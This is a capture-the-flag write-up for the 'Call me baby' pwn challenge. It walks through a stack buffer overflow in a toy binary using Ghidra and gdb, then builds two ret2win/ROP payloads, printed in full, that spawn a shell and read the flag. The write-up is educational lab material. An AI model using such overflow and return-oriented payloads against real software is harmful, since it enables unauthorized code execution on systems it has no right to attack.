# Call me baby

Subject :

```md
You just had the best idea, why not write a love letter to your crush ?

http://internetcest.fun:13337
```

[This binary](./call_me_baby) is given. Let's try it out :

```bash
$ ./call_me_baby 
Write your love letter: 
test
You should call her instead...
```

Again, the program is asking for an input and then exiting. Let's explore the code.

## Static analysis

Using Ghidra, we find those functions :

```C
undefined8 main(void)
{
  setup();
  vuln();
  puts("You should call her instead...");
  return 0;
}

void vuln(void)
{
  undefined local_48 [64];
  
  puts("Write your love letter: ");
  read(0,local_48,100);
  return;
}

void call_me(undefined8 param_1)
{
  int iVar1;
  undefined8 local_10;
  
  local_10 = param_1;
  iVar1 = strcmp((char *)&local_10,"baby");
  if (iVar1 == 0) {
    execve("/bin/sh",(char **)0x0,(char **)0x0);
  }
  else {
    puts("... I said call me baby !!!!");
  }
  return;
}

void gadgets(void)
{
  return;
}
```

We need to execute `execve("/bin/sh",(char **)0x0,(char **)0x0);` in call_me().  
  
The read() function is expecting 100 bytes (`read(0,local_48,100);`), even tho the local_48 variable used to store the user input is only 64 bytes long (`undefined local_48 [64];`). This is vulnerable to a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow), so we'll exploit it to redirect the program towards the call_me() function.

# Dynamic analysis

In the stack, after the rbp (Register Base Pointer, which points to the base of the current stack) is stored a pointer to where the program will have to go next. For example, after running the vuln() function, the program will return to the main() function. So the next value after the rbp will be a pointer towards the main function. By overwriting this pointer, we can redirect the program execution.  
  
Let's find out how many bytes we need to write over. First, we'll disassemble the vuln() function and add a breakpoint after the read() function is called :

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004011dd <+0>:	push   %rbp
   0x00000000004011de <+1>:	mov    %rsp,%rbp
   0x00000000004011e1 <+4>:	sub    $0x40,%rsp
   0x00000000004011e5 <+8>:	lea    0xe46(%rip),%rax        # 0x402032
   0x00000000004011ec <+15>:	mov    %rax,%rdi
   0x00000000004011ef <+18>:	call   0x401030 <puts@plt>
   0x00000000004011f4 <+23>:	lea    -0x40(%rbp),%rax
   0x00000000004011f8 <+27>:	mov    $0x64,%edx
   0x00000000004011fd <+32>:	mov    %rax,%rsi
   0x0000000000401200 <+35>:	mov    $0x0,%edi
   0x0000000000401205 <+40>:	call   0x401050 <read@plt>
   0x000000000040120a <+45>:	nop
   0x000000000040120b <+46>:	leave
   0x000000000040120c <+47>:	ret
End of assembler dump.
(gdb) break *vuln+45
Breakpoint 2 at 0x40120a
```

Now we'll input 64 characters using python to fill up local_48, and inspect the register to see how many bytes we need to write over before reaching the rbp :

```gdb
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Write your love letter: 

Breakpoint 2, 0x000000000040120a in vuln ()
(gdb) x/24wx $rsp
0x7fffffffd9c0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9d0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9e0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffd9f0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda00:	0xffffda0a	0x00007fff	0x00401230	0x00000000
0x7fffffffda10:	0xffffdb38	0x00007fff	0x00000000	0x00000001
(gdb) info register
rax            0x41                65
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x0                 0
rbp            0x7fffffffda00      0x7fffffffda00
rsp            0x7fffffffd9c0      0x7fffffffd9c0
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x40120a            0x40120a <vuln+45>
eflags         0x207               [ CF PF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

The `x/24wx $rsp` command is printing out the stack, we can easily spot the "\x41" characters we gave to the program. Next we use the `info register` command to print out the register and find out where the rbp is : `rbp            0x7fffffffda00`. Looking at the stack, we can see that the rbp is right next to our input. We'll only need to write over the rbp (8 bytes) to reach the return address.  
  
Now let's find the address of the call_me() function we want to reach :

```gdb
(gdb) info func call_me
All functions matching regular expression "call_me":

Non-debugging symbols:
0x000000000040118a  call_me
```

The address is : `0x000000000040118a`. Let's rewrite our payload, we'll need to input 64 characters to write over local_48, 8 characters to write over the rbp, and then give a pointer to the call_me() function (in reverse since we're on a [little endian system](https://en.wikipedia.org/wiki/Endianness)) :

```gdb
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x41"*8+b"\x8a\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
... I said call me baby !!!!

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdb0a in ?? ()
```

Looking back at our static analysis and the call_me() function, we understand that we've reached the function, but didn't pass this condition :

```C
  iVar1 = strcmp((char *)&local_10,"baby");
  if (iVar1 == 0) {
```

To pass this condition, we need to modify local_10, which is a variable taken as argument to the call_me() function. 
  
To do so, we should either :
 - Modify the register to modify the argument given to call_me() when we call it.
 - Directly redirect the program towards the instruction `execve("/bin/sh",(char **)0x0,(char **)0x0);`.

(The second solution being easier, directly go there if you want the simplest approch).

### Solution 1

To modify the register we can use [gadgets](./https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets), which are instructions such as `pop rdi; ret`.

Since rdi is used to store the argument given to call_me(), let's use ROPGadgets to find a way to modify rdi :

```bash
$ ROPgadget --binary call_me_baby | grep 'rdi'
0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; ret
0x0000000000401168 : mov ebp, esp ; pop rdi ; ret
0x0000000000401167 : mov rbp, rsp ; pop rdi ; ret
0x000000000040116a : pop rdi ; ret
0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; ret
```

We found `pop rdi; ret` which is exaclty what we want : the `pop rdi` instruction will save the last value on the stack into rdi, and the `ret` instruction will redirect the program towards the next value on the stack.  
  
Let's look at the gadget we found on gdb :
  
```gdb
(gdb) x/2wi 0x000000000040116a
   0x40116a <gadgets+4>:	pop    %rdi
   0x40116b <gadgets+5>:	ret
```

Apparently those instructions are part of the function gadgets() we saw earlier during our static analysis. Let's look further into this function :

```gdb
(gdb) info function gadgets
all functions matching regular expression "gadgets":

non-debugging symbols:
0x0000000000401166  gadgets
(gdb) disas gadgets
dump of assembler code for function gadgets:
   0x0000000000401166 <+0>:	push   %rbp
   0x0000000000401167 <+1>:	mov    %rsp,%rbp
   0x000000000040116a <+4>:	pop    %rdi
   0x000000000040116b <+5>:	ret
   0x000000000040116c <+6>:	nop
   0x000000000040116d <+7>:	pop    %rbp
   0x000000000040116e <+8>:	ret
end of assembler dump.
```

This function is pushing the rbp onto the stack, then poping the stack into the rdi. In other words, the value contained in the rbp will end up in the rdi.  
  
So we need to overwrite the rbp with the value we want in the rdi, and then call the function gadgets(). Let's try a payload : 64 bytes to overwrite local_48, 'baby' in hexadecimals (to be written over the rbp), and the pointer to the gadgets() function. Let's put a breakpoint at the function gadgetsi() and see what's going on :

```gdb
(gdb) break *gadgets
breakpoint 4 at 0x401166
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
the program being debugged has been started already.
start it from the beginning? (y or n) y
starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4)')
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
write your love letter: 

breakpoint 4, 0x0000000000401166 in gadgets ()
(gdb) disas
dump of assembler code for function gadgets:
=> 0x0000000000401166 <+0>:	push   %rbp
   0x0000000000401167 <+1>:	mov    %rsp,%rbp
   0x000000000040116a <+4>:	pop    %rdi
   0x000000000040116b <+5>:	ret
   0x000000000040116c <+6>:	nop
   0x000000000040116d <+7>:	pop    %rbp
   0x000000000040116e <+8>:	ret
end of assembler dump.
```

We've successfully reached gadgets(). Let's add a breakpoint after the instruction `pop rdi` and check if the register is being modified :

```gdb
(gdb) break *gadgets+5
breakpoint 5 at 0x40116b
(gdb) info register
rax            0x51                81
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x0                 0
rbp            0x79626162          0x79626162
rsp            0x7fffffffda10      0x7fffffffda10
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x401166            0x401166 <gadgets>
eflags         0x203               [ cf if ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) continue
continuing.

breakpoint 5, 0x000000000040116b in gadgets ()
(gdb) info register
rax            0x51                81
rbx            0x7fffffffdb38      140737488345912
rcx            0x7ffff7ec0a5d      140737352829533
rdx            0x64                100
rsi            0x7fffffffd9c0      140737488345536
rdi            0x79626162          2036490594
rbp            0x7fffffffda08      0x7fffffffda08
rsp            0x7fffffffda10      0x7fffffffda10
r8             0x0                 0
r9             0x7ffff7fcfb10      140737353939728
r10            0x7ffff7dd8b08      140737351879432
r11            0x246               582
r12            0x0                 0
r13            0x7fffffffdb48      140737488345928
r14            0x403df0            4210160
r15            0x7ffff7ffd000      140737354125312
rip            0x40116b            0x40116b <gadgets+5>
eflags         0x203               [ cf if ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```

Using the `info register` command to check the register, we can see that the rdi has been modified.
  
Now let's add a pointer to the call_me() function at the end of our payload, so that it's called after we modified the rdi :

```gdb
(gdb) info function call_me
all functions matching regular expression "call_me":

non-debugging symbols:
0x000000000040118a  call_me
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
the program being debugged has been started already.
start it from the beginning? (y or n) y
starting program: /home/coucou/documents/ctf_ssi_2024/call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)')
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
write your love letter: 
process 6806 is executing new program: /usr/bin/dash
error in re-setting breakpoint 1: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 2: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 3: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 4: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 5: no symbol table is loaded.  use the "file" command.
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
[thread debugging using libthread_db enabled]
using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
error in re-setting breakpoint 1: no symbol "vuln" in current context.
error in re-setting breakpoint 2: no symbol "vuln" in current context.
error in re-setting breakpoint 3: no symbol "call_me" in current context.
error in re-setting breakpoint 4: no symbol "gadgets" in current context.
error in re-setting breakpoint 5: no symbol "gadgets" in current context.
[inferior 1 (process 6806) exited normally]
```

Gdb is trying to run another process. Let's try our payload on the binary the same way we did on the previous challenge :

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
Write your love letter: 
whoami
coucou
ls
README.md  call_me_baby  exploit.py
```

We successfully opened a shell, so the final payload is : `"\x41"*64+"\x62\x61\x62\x79"+"\x00"*4+"\x66\x11\x40\x00"+"\x00"*4+"\x8a\x11\x40\x00"+"\x00"*4`.

## Solution 2

We need to find the pointer to the instruction calling the execve() function. Let's disassemble the function call_me() in gdb to do so :

```gdb
(gdb) disas call_me
Dump of assembler code for function call_me:
   0x000000000040118a <+0>:	push   %rbp
   0x000000000040118b <+1>:	mov    %rsp,%rbp
   0x000000000040118e <+4>:	sub    $0x10,%rsp
   0x0000000000401192 <+8>:	mov    %rdi,-0x8(%rbp)
   0x0000000000401196 <+12>:	lea    -0x8(%rbp),%rax
   0x000000000040119a <+16>:	lea    0xe67(%rip),%rdx        # 0x402008
   0x00000000004011a1 <+23>:	mov    %rdx,%rsi
   0x00000000004011a4 <+26>:	mov    %rax,%rdi
   0x00000000004011a7 <+29>:	call   0x401070 <strcmp@plt>
   0x00000000004011ac <+34>:	test   %eax,%eax
   0x00000000004011ae <+36>:	jne    0x4011cb <call_me+65>
   0x00000000004011b0 <+38>:	mov    $0x0,%edx
   0x00000000004011b5 <+43>:	mov    $0x0,%esi
   0x00000000004011ba <+48>:	lea    0xe4c(%rip),%rax        # 0x40200d
   0x00000000004011c1 <+55>:	mov    %rax,%rdi
   0x00000000004011c4 <+58>:	call   0x401060 <execve@plt>
   0x00000000004011c9 <+63>:	jmp    0x4011da <call_me+80>
   0x00000000004011cb <+65>:	lea    0xe43(%rip),%rax        # 0x402015
   0x00000000004011d2 <+72>:	mov    %rax,%rdi
   0x00000000004011d5 <+75>:	call   0x401030 <puts@plt>
   0x00000000004011da <+80>:	nop
   0x00000000004011db <+81>:	leave
   0x00000000004011dc <+82>:	ret
End of assembler dump.
```

We can see that the instruction is being called at the address `0x00000000004011c4`. Let's try a payload : 72 characters to overwrite local_48 and the rbp, followed by the pointer to the execve() function. 

```gdb
(gdb) run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
Starting program: /home/coucou/Documents/CTF_SSI_2024/Call_me_baby/call_me_baby <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Write your love letter: 
process 6977 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 2: No symbol "call_me" in current context.
[Inferior 1 (process 6977) exited normally]
```

Gdb is trying to start a new process. Let's try our payload on the binary :

```bash
$ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
Write your love letter: 
whoami
coucou
ls
README.md  call_me_baby  exploit1.py  exploit2.py
```

We successfully got a shell, so our final payload is : `"\x41"*72+"\xb0\x11\x40\x00"+"\x00"*4`.

# Exploit

Same as before, let's use some python scripts to send our payload.

## Exploit 1

[Script](./exploit1.py)

```bash
$ python3 exploit1.py 
b'Write your love letter: \n'
whoami
b'root\n'
ls
b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
cat flag.txt
b'FLAG{C4ll1ng_b4by...}\n'
```

## Exploit 2

[Script](./exploit2.py)

```console
$ python3 exploit2.py 
b'Write your love letter: \n'
whoami
b'root\n'
ls
b'call_me_baby\ncall_me_baby.c\ncore\nflag.txt\n'
cat flag.txt
b'FLAG{C4ll1ng_b4by...}\n'
```
